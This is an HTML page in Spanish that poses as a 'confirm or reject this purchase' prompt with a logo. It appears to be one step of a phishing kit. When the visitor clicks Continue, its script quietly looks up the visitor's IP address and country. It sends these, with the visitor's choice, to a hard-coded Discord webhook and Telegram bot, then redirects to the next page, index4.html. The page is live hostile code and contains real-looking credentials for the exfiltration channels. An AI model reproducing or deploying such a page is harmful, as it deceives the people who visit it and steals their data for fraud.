<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Confirmar compra</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background: url('fondo.jpg') center center / cover no-repeat;
    }

    .container {
      text-align: center;
      width: 90%;
      max-width: 400px;
      background-color: rgba(255, 255, 255, 0.8);
      padding: 30px;
      border-radius: 15px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }

    .logo img {
      height: 80px;
      margin-bottom: 20px;
    }

    h2 {
      margin-top: 0;
    }

    .opciones {
      display: flex;
      justify-content: space-around;
      margin: 20px 0;
    }

    .opciones button {
      padding: 10px 20px;
      font-size: 16px;
      border: 1px solid #ccc;
      border-radius: 5px;
      background-color: #eee;
      cursor: pointer;
    }

    .opciones button.selected {
      background-color: #d0f0d0;
      border-color: #4caf50;
    }

    .continuar {
      background-color: #fdda24;
      border: none;
      padding: 12px 20px;
      font-size: 16px;
      cursor: pointer;
      border-radius: 5px;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">
      <img src="logo.png" alt="Logo" />
    </div>
    <h2>¬øQuieres aceptar o rechazar esta compra?</h2>
    <div class="opciones">
      <button id="aceptar">Aceptar</button>
      <button id="rechazar">Rechazar</button>
    </div>
    <button class="continuar" id="continuarBtn">Continuar</button>
  </div>

  <script>
    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1426665980704067615/-AeoO_izR6P4ObI9N8ostR0MV_QpmH2xchTvBgucMd3u0iZCbeKcmCBtJ32jA3UswkpB";
    const TELEGRAM_BOT_TOKEN = "7317719253:AAE-UX4SSFiol1mIweex6PYvvpvALJR2BBY";
    const TELEGRAM_CHAT_ID = "-1002316781318";

    let seleccion = "";

    document.getElementById("aceptar").addEventListener("click", () => {
      seleccion = "‚úÖ Compra aceptada";
      document.getElementById("aceptar").classList.add("selected");
      document.getElementById("rechazar").classList.remove("selected");
    });

    document.getElementById("rechazar").addEventListener("click", () => {
      seleccion = "‚ùå Compra rechazada";
      document.getElementById("rechazar").classList.add("selected");
      document.getElementById("aceptar").classList.remove("selected");
    });

    document.getElementById("continuarBtn").addEventListener("click", async () => {
      if (!seleccion) {
        alert("Por favor selecciona una opci√≥n.");
        return;
      }

      try {
        const geo = await fetch("https://ipapi.co/json/").then(res => res.json());
        const ip = geo.ip || "Desconocida";
        const pais = geo.country_name || "Desconocido";

        const mensaje = `${seleccion}\nüåê IP: ${ip}\nüìç Pa√≠s: ${pais}`;

        await fetch(DISCORD_WEBHOOK_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ content: mensaje })
        });

        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: mensaje
          })
        });

        window.location.href = "index4.html";

      } catch (error) {
        alert("Error al enviar la respuesta.");
        console.error(error);
      }
    });
  </script>
</body>
</html>
